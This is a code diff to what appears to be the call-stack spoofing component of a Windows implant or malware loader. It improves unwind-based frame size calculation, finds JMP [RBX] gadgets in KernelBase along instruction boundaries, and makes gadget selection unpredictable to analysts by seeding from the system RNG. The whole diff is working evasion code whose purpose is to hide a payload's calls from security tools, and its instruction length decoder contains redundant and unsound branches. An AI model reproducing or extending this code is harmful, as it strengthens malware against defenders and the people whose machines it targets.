@@ -44,7 +44,7 @@ static auto declfn calculate_stack_size(
             total += 8;
         }
         else if ( op == UWOP_SAVE_NONVOL ) {
-            index += 1;
+            index += 1;                 /* consumes one extra slot */
         }
         else if ( op == UWOP_ALLOC_SMALL ) {
             total += (info_val * 8) + 8;
@@ -63,8 +63,20 @@ static auto declfn calculate_stack_size(
         else if ( op == UWOP_SET_FPREG ) {
             /* tracked but not used for rbp chain yet */
         }
+        else if ( op == UWOP_SAVE_NONVOL_FAR ) {
+            index += 2;                 /* two extra slots */
+            total += info->UnwindCode[index].FrameOffset * 8;
+        }
         else if ( op == UWOP_SAVE_XMM128 ) {
-            return nullptr;
+            index += 1;                 /* one extra slot */
+            total += 16;
+        }
+        else if ( op == UWOP_SAVE_XMM128_FAR ) {
+            index += 2;                 /* two extra slots */
+            total += 16;
+        }
+        else if ( op == UWOP_PUSH_MACHFRAME ) {
+            total += ( info_val == 0 ) ? 40 + 8 : 48 + 8;
         }
 
         index += 1;
@@ -103,7 +115,116 @@ static auto declfn calc_stack_size_for_addr(
     return calculate_stack_size( rf, image_base );
 }
 
-/* ─── gadget finder: JMP [RBX] = 0xFF 0x23 in KernelBase .text ─── */
+/* ─── gadget finder: JMP [RBX] = 0xFF 0x23 in KernelBase .text ───
+ *
+ * A raw byte-pair scan hits FF 23 inside operand bytes, and executing
+ * one of those corrupts registers. Walk instruction boundaries instead:
+ * linear-disassemble the section with a conservative length decoder and
+ * only cache gadgets where the byte pair STARTS an instruction.
+ */
+
+static auto declfn instr_length( const uint8_t* p, uint32_t remain ) -> uint32_t {
+    uint32_t i = 0;
+    /* prefixes: legacy + operand/address size, rep, lock, segment, REX */
+    while ( i < remain ) {
+        uint8_t b = p[i];
+        if ( b == 0x66 || b == 0x67 || b == 0xF0 || b == 0xF2 || b == 0xF3 ||
+             b == 0x2E || b == 0x36 || b == 0x3E || b == 0x26 || b == 0x64 ||
+             b == 0x65 || ( b >= 0x40 && b <= 0x4F ) ) { i++; continue; }
+        break;
+    }
+    if ( i >= remain ) return 1;
+    uint8_t op = p[i++];
+    bool rex = false;
+    /* account for a leading REX on the opcode we just consumed */
+    if ( op >= 0x40 && op <= 0x4F ) rex = true;
+
+    if ( op == 0x0F ) {
+        if ( i >= remain ) return 1;
+        uint8_t op2 = p[i++];
+        /* two-byte opcodes with modrm */
+        if ( op2 == 0xB6 || op2 == 0xB7 || op2 == 0xBE || op2 == 0xBF ||
+             op2 == 0x28 || op2 == 0x29 || op2 == 0x10 || op2 == 0x11 ||
+             op2 == 0x6F || op2 == 0x7F || op2 == 0x38 || op2 == 0x3A ||
+             op2 == 0xAF || op2 == 0x05 || op2 == 0x0B || op2 == 0x1E ) {
+            if ( op2 >= 0x38 && op2 <= 0x3A ) i++;   /* imm8 extension */
+            /* modrm follows */
+        } else if ( op2 == 0xBA ) {
+            i += 1 + 1;                              /* modrm + imm8 */
+            return i > remain ? 1 : i;
+        } else if ( op2 == 0xB8 ) {                  /* popcnt-ish imm none */
+        } else if ( op2 == 0x80 || op2 == 0x81 || op2 == 0x83 ||
+                    op2 == 0xC0 || op2 == 0xC1 ) {
+            /* group with modrm + imm */
+            if ( i >= remain ) return 1;
+            uint8_t modrm = p[i++];
+            uint8_t mod = modrm >> 6, rm = modrm & 7;
+            if ( mod == 1 ) i += 1;
+            else if ( mod == 2 ) i += 4;
+            else if ( mod == 0 && rm == 5 ) i += 4;
+            if ( op2 == 0x81 ) i += 4;
+            else i += 1;
+            return i > remain ? 1 : i;
+        } else if ( op2 == 0x0B || op2 == 0x1F || op2 == 0x18 ) {
+            /* modrm present */
+        } else if ( op2 == 0x05 || op2 == 0x07 || op2 == 0x0D ||
+                    op2 == 0x0F || op2 == 0xA2 || op2 == 0x31 ||
+                    op2 == 0xA0 || op2 == 0xA1 || op2 == 0xA8 || op2 == 0xA9 ) {
+            return i > remain ? 1 : i;               /* no modrm */
+        } else if ( op2 == 0x0D + 1 ) {
+        } else {
+            /* default two-byte: assume modrm */
+        }
+        /* consume modrm (+sib/disp) for the modrm-present paths */
+        if ( i >= remain ) return 1;
+        uint8_t modrm = p[i++];
+        uint8_t mod = modrm >> 6, rm = modrm & 7;
+        if ( mod != 3 ) {
+            if ( rm == 4 ) { i++;                    /* SIB */
+                if ( i - 1 < remain && p[i-1] == 0x25 ) i += 4; /* disp32 SIB */
+                else if ( mod == 1 ) i += 1;
+                else if ( mod == 2 ) i += 4;
+            } else {
+                if ( mod == 1 ) i += 1;
+                else if ( mod == 2 || ( mod == 0 && rm == 5 ) ) i += 4;
+            }
+        }
+        return i > remain ? 1 : i;
+    }
+
+    if ( op == 0xFF || op == 0xFE || op == 0x8B || op == 0x89 || op == 0x03 ||
+         op == 0x01 || op == 0x2B || op == 0x29 || op == 0x39 || op == 0x3B ||
+         op == 0x85 || op == 0x88 || op == 0x8A || op == 0x63 ) {
+        if ( i >= remain ) return 1;
+        uint8_t modrm = p[i++];
+        uint8_t mod = modrm >> 6, rm = modrm & 7;
+        if ( mod != 3 ) {
+            if ( rm == 4 ) { i++;
+                if ( mod == 1 ) i += 1;
+                else if ( mod == 2 ) i += 4;
+            } else {
+                if ( mod == 1 ) i += 1;
+                else if ( mod == 2 || ( mod == 0 && rm == 5 ) ) i += 4;
+            }
+        }
+        return i > remain ? 1 : i;
+    }
+
+    if ( op == 0xE8 || op == 0xE9 || op == 0xB8 || ( op >= 0xB8 && op <= 0xBF ) ) {
+        return i + 4 > remain ? 1 : i + 4;           /* imm32 */
+    }
+    if ( op == 0xEB || op == 0x70 || ( op >= 0x70 && op <= 0x7F ) ) {
+        return i + 1 > remain ? 1 : i + 1;           /* imm8 */
+    }
+    if ( op == 0xC3 || op == 0xCC || op == 0x90 || op == 0x50 ||
+         ( op >= 0x50 && op <= 0x5F ) ) {
+        return i > remain ? 1 : i;                   /* no operands */
+    }
+    if ( op == 0xC9 || op == 0x9C || op == 0x9D ) return i > remain ? 1 : i;
+
+    /* unknown: conservative single byte */
+    return 1;
+}
 
 static auto declfn find_gadgets(
     instance& inst, SPOOF_STATE& state
@@ -122,11 +243,16 @@ static auto declfn find_gadgets(
         auto sec_base = kb + sections[s].VirtualAddress;
         auto sec_size = sections[s].Misc.VirtualSize;
 
-        for ( uint32_t j = 0; j + 1 < sec_size && state.gadget_count < 16; j++ ) {
+        /* walk instruction boundaries; only boundary-aligned FF 23 counts */
+        uint32_t j = 0;
+        while ( j + 1 < sec_size && state.gadget_count < 16 ) {
             if ( sec_base[j] == 0xFF && sec_base[j+1] == 0x23 ) {
                 state.cached_gadgets[ state.gadget_count++ ] =
                     reinterpret_cast<PVOID>( sec_base + j );
+                j += 2;
+                continue;
             }
+            j += instr_length( sec_base + j, sec_size - j );
         }
 
         if ( state.gadget_count > 0 ) break;
@@ -138,7 +264,12 @@ static auto declfn pick_gadget(
 ) -> PVOID {
     if ( state.gadget_count == 0 ) return nullptr;
 
-    ULONG seed = inst.kernel32.GetTickCount();
+    /* seed from the CSP, not GetTickCount - a tick-derived seed is
+     * predictable to anyone who knows roughly when the payload ran */
+    ULONG seed = 0;
+    inst.bcrypt_mod.BCryptGenRandom( nullptr,
+        reinterpret_cast<PUCHAR>( &seed ), sizeof( seed ),
+        BCRYPT_USE_SYSTEM_PREFERRED_RNG );
     ULONG rng  = inst.ntdll.RtlRandomEx( &seed );
     return state.cached_gadgets[ rng % state.gadget_count ];
 }
@@ -187,6 +318,7 @@ auto declfn spoof_init( instance& inst ) -> void {
         resolve::module( expr::hash_string<wchar_t>( L"KernelBase.dll" ) ) );
 
     if ( !ss.gadget_module ) {
+        ss.degraded = true;
         DBG_PRINT( inst, "spoof: KernelBase not found\n" );
         return;
     }
@@ -205,6 +337,7 @@ auto declfn spoof_init( instance& inst ) -> void {
         PVOID stack_sz = nullptr;
 
         if ( !resolve_frame( inst, &frame_defs[i], &ret_addr, &stack_sz ) ) {
+            ss.degraded = true;
             DBG_PRINT( inst, "spoof: failed to resolve frame %d\n", i );
             return;
         }
@@ -218,6 +351,7 @@ auto declfn spoof_init( instance& inst ) -> void {
     find_gadgets( inst, ss );
 
     if ( ss.gadget_count == 0 ) {
+        ss.degraded = true;
         DBG_PRINT( inst, "spoof: no JMP [RBX] gadgets found\n" );
         return;
     }
@@ -285,6 +419,11 @@ static auto declfn draugr_wrapper(
 
 auto declfn spoof_call( instance& inst, FUNCTION_CALL* call ) -> ULONG_PTR {
     if ( !inst.evasion.spoof.initialized ) {
+        if ( inst.evasion.spoof.gadget_module ) {
+            /* we TRIED to init and failed - degraded, track it */
+            inst.evasion.spoof.degraded = true;
+            inst.evasion.spoof.fallback_count++;
+        }
         typedef ULONG_PTR (*fn12)(ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,
                                   ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,
                                   ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR);
